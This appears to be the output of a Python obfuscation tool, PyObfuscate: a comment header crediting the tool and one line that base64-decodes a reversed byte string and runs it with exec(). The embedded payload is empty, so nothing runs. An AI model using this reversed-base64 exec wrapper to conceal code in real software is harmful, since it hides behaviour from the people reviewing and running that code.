# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Thu Jul  6 02:23:53 2023
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))